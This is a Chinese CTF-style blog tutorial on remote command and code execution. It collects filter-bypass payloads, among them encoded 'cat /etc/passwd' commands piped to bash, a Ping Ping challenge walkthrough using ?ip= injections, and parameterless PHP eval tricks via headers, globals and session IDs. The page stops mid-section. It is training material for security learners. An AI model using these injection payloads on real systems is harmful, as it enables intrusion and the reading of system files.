<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>rce? | Gh0stのblog</title><meta name="keywords" content="奇技淫巧"><meta name="author" content="gh0st"><meta name="copyright" content="gh0st"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="命令执行(rce)代码执行函数 123456789&#x2F;&#x2F;phpeval()assert()create_function()preg_replace() +&#x2F;e模式(PHP版本&lt;5.5.0)call_user_func()&#x2F;&#x2F;Javascripteval()  命令执行函数 1234567891011&#x2F;&#x2F;phpsystem()exec()  &#x2F;&#x2F;无回显passthru() shell_exec">
<meta property="og:type" content="article">
<meta property="og:title" content="rce?">
<meta property="og:url" content="https://gh0st-9.github.io/2022/10/07/rce/index.html">
<meta property="og:site_name" content="Gh0stのblog">
<meta property="og:description" content="命令执行(rce)代码执行函数 123456789&#x2F;&#x2F;phpeval()assert()create_function()preg_replace() +&#x2F;e模式(PHP版本&lt;5.5.0)call_user_func()&#x2F;&#x2F;Javascripteval()  命令执行函数 1234567891011&#x2F;&#x2F;phpsystem()exec()  &#x2F;&#x2F;无回显passthru() shell_exec">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.ax1x.com/2022/11/19/zKnxjf.png">
<meta property="article:published_time" content="2022-10-07T04:10:33.000Z">
<meta property="article:modified_time" content="2022-11-19T09:50:20.558Z">
<meta property="article:author" content="gh0st">
<meta property="article:tag" content="奇技淫巧">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2022/11/19/zKnxjf.png"><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="https://gh0st-9.github.io/2022/10/07/rce/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?616c9cb767938a90fcc5fa4c20635c46";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"TQGE5RYJPT","apiKey":"f4ae611eb7599c36f354ba51803b8e85","indexName":"index","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'rce?',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-19 17:50:20'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/rgb.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://images.wallpaperscraft.com/image/single/night_city_thunderstorm_top_view_117094_1920x1080.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Gh0stのblog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">rce?</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-07T04:10:33.000Z" title="发表于 2022-10-07 12:10:33">2022-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-19T09:50:20.558Z" title="更新于 2022-11-19 17:50:20">2022-11-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/rce/">rce</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="rce?"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="命令执行-rce"><a href="#命令执行-rce" class="headerlink" title="命令执行(rce)"></a>命令执行(rce)</h1><p><strong>代码执行函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">create_function()</span><br><span class="line">preg_replace() +/e模式(PHP版本&lt;5.5.0)</span><br><span class="line">call_user_func()</span><br><span class="line"></span><br><span class="line">//Javascript</span><br><span class="line">eval()</span><br></pre></td></tr></table></figure>

<p><strong>命令执行函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">system()</span><br><span class="line">exec()  //无回显</span><br><span class="line">passthru() </span><br><span class="line">shell_exec()</span><br><span class="line">``反引号</span><br><span class="line"></span><br><span class="line">//python</span><br><span class="line">popen()</span><br><span class="line">proc_open() </span><br><span class="line">exec()</span><br></pre></td></tr></table></figure>

<p><strong>命令连接符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A;B //先执行A，再执行B</span><br><span class="line"></span><br><span class="line">A|B //只执行B那条命令</span><br><span class="line"> </span><br><span class="line">A||B //A执行失败才会执行B</span><br><span class="line"></span><br><span class="line">A&amp;B //AB两条命令都会执行</span><br><span class="line"> </span><br><span class="line">A&amp;&amp;B //A执行成功才会执行B</span><br></pre></td></tr></table></figure>

<h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><p>绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;和&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20(space)</span><br><span class="line">%09(tab)</span><br></pre></td></tr></table></figure>

<p>绕过<strong>flag</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;cat $a$b</span><br><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line">fl\ag</span><br><span class="line">cat f&quot;&quot;lag</span><br><span class="line">cat f*</span><br><span class="line">cat f???</span><br><span class="line">cat ????.???</span><br></pre></td></tr></table></figure>

<p><strong>绕过cat</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nl</span><br><span class="line">head</span><br><span class="line">tail</span><br><span class="line">ca\t</span><br><span class="line">more</span><br><span class="line">tac</span><br><span class="line">sort</span><br><span class="line">od</span><br><span class="line">uniq</span><br><span class="line">less</span><br></pre></td></tr></table></figure>

<p><strong>绕过php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= #短标签</span><br><span class="line">Php #大小写</span><br></pre></td></tr></table></figure>

<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p><strong>hex编码(十六进制）</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202F6574632F706173737764&quot;</span> | xxd -r -p|bash   <span class="comment">#cat /etc/passwd</span></span><br></pre></td></tr></table></figure>

<p><strong>oct编码(八进制)</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)  <span class="comment">#ls</span></span><br></pre></td></tr></table></figure>

<p><strong>base64编码</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y2F0IC9ldGMvcGFzc3dk <span class="comment">#cat /etc/passwd</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure>

<h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> test.txt</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t /etc/passwd</span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /etc/passwd</span><br><span class="line">c``a``t /etc/passwd</span><br><span class="line">ca\t /etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><p>Linux下的glob通配符：</p>
<ul>
<li><code>*</code>可以代替0个及以上任意字符</li>
<li><code>?</code>可以代表1个任意字符</li>
</ul>
<p>例如<code>cat 1.php</code>可以写成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] 1.???        #/???/?[a][t]回去匹配/bin/cat</span><br></pre></td></tr></table></figure>

<p>在glob里</p>
<p><code>[A-Za-z0-9]</code>相当于所有数字和大小写字母</p>
<p><code>[-%]</code> 代表<code>[!”#$%]</code>而<code>[az]</code>代表任何小写字母</p>
<p><code>[@-[]</code>表示大写字母</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. [...]表示匹配方括号之中的任意一个字符</span><br><span class="line">2. &#123;…&#125;表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</span><br><span class="line">3. &#123;...&#125;与[...]有一个重要的区别，当匹配的文件不存在，[...]会失去模式的功能，变成一个单纯的字符串，而&#123;...&#125;依然可以展开</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> t[a-z]st</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082123331.png" alt="image-20221008212308275"></p>
<p><strong>一个小小的例题</strong></p>
<h2 id="GXYCTF2019-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping"></a>[GXYCTF2019]Ping Ping</h2><p>提示&#x2F;?ip&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082242873.png" alt="image-20221008224212832"></p>
<p>读取flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071554412.png" alt="在这里插入图片描述"></p>
<p>读取index.php，空格用<code>$IFS$1</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210072018448.png" alt="image-20221007201812408"></p>
<p>方法一:字符串拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>

<p>查看源码得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071554411.png" alt="在这里插入图片描述"></p>
<p>法二:将反引号内命令的输出作为输入执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;<span class="built_in">cat</span>$IFS<span class="variable">$1</span>`<span class="built_in">ls</span>`</span><br></pre></td></tr></table></figure>

<p>查看源码，获得flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082243753.png" alt="image-20221008224333709"></p>
<h1 id="环境变量取值rce"><a href="#环境变量取值rce" class="headerlink" title="环境变量取值rce"></a>环境变量取值rce</h1><p>Linux下默认存在一些环境变量，可通过env查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082137603.png" alt="image-20221008213713529"></p>
<p>通过截取可获得特定字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082139149.png" alt="image-20221008213918093"></p>
<p>比如比较重要的管道符<code>|</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082241804.png" alt="image-20221008224145767"></p>
<p>再如<code>cat</code></p>
<p>这样就拿到了<code>cat</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082142228.png" alt="image-20221008214220186"></p>
<p>成功执行命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082143061.png" alt="image-20221008214329018"></p>
<p>此外，还可以配合上面所说到的编码获取一些特殊字符</p>
<h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>基本代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>(?R)</code>表示引用当前表达式，也就是php的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/regexp.reference.recursive.php">递归模式</a></p>
<p>该正则，正是无参数函数的校验，只允许执行如下格式函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br><span class="line">a(b(c()));</span><br></pre></td></tr></table></figure>

<p><strong>相关函数</strong></p>
<p>读文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>

<p>其他函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>()</span><br><span class="line"><span class="title function_ invoke__">getenv</span>() <span class="comment">//获取一个环境变量的值。</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() <span class="comment">//从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() <span class="comment">//array_flip()返回一个反转后的array，例如array中的键名变成了值，而array中的值成了键名。</span></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() <span class="comment">//获取http header信息(中间件必须为apache)</span></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() <span class="comment">//获取全局变量</span></span><br><span class="line"><span class="title function_ invoke__">session_id</span>() <span class="comment">//session_id()可以用来获取/设置当前会话ID。</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>() <span class="comment">//遍历目录</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>() <span class="comment">//获取当前目录</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>() <span class="comment">//返回上级目录</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>() <span class="comment">//更改当前目录</span></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>() <span class="comment">//返回一个包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//输出数组中的当前元素的值</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() <span class="comment">//将数组进行倒序</span></span><br><span class="line"><span class="title function_ invoke__">next</span>() <span class="comment">//将内部指针指向数组中的下一个元素，并输出。</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>打印出所有http请求头信息，需apache2环境</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081131687.png" alt="image-20221008113125635"></p>
<p>构造恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081129289.png" alt="image-20221008112937236"></p>
<p>利用end()将结果中的恶意代码取出并利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081130259.png" alt="image-20221008113046202"></p>
<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>相较于getallheaders()的局限性，显然get_defined_vars()的使用更广泛</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081145499.png" alt="image-20221008114558462"></p>
<p>以数组形式打印出所有全局变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span></span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_FILES</span></span><br><span class="line"><span class="variable">$_COOKIE</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081149429.png" alt="image-20221008114903386"></p>
<p>利用方式也就呼之欲出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;test=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081152214.png" alt="image-20221008115213161"></p>
<h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id"></a>session_id</h3><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081155600.png" alt="image-20221008115548563"></p>
<p>session_id()的作用就是获取当前会话的ID,也就是cookie中的phpsession的值，通过构造PHPSESSID为恶意代码执行命令<br>需要注意的一点是，phpsession中只允许出现 a-z A-Z 0-9 , - 等字符，所以不能直接插入恶意代码，需要先将其进行16进制编码后再插入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081159770.png" alt="image-20221008115914731"></p>
<p>执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081159594.png" alt="image-20221008115944539"></p>
<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>array_rand()配合array_flip()获取数组值</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081203722.png" alt="image-20221008120313683"></p>
<p>current()配合localeconv()获取<code>.</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line">    </span><br><span class="line"><span class="comment">//output:&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>查看当前目录下的文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(.));</span><br></pre></td></tr></table></figure>

<p><strong>查看当前目录下的文件(过滤<code>.</code>)</strong></p>
